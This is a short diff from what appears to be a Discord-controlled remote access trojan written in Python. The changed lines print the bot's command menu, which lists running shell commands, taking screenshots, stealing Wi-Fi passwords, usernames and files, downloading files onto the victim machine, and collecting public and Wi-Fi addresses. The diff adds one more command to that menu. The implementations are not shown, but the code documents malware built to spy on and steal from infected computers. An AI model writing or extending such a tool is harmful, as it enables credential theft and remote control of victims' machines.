@@ -59,7 +59,7 @@ async def on_ready():
             f"Session: `{session}`\n"
             "--- Commands ---\n"
             "`!cmd <command>` | `!screen` | `!stealwifipasswords` | `!stealusernames`\n"
-            "`!stealfile <file>` | `!saveoncomputer <link>` | `!stealpublicaddress` | `!stealwifiaddresses` "
+            "`!stealfile <file>` | `!saveoncomputer <link>` | `!stealpublicaddress` | `!stealwifiaddresses` | `!chatsendmsg` "
         )
         await channel_ref.send(header)
     except Exception as e:
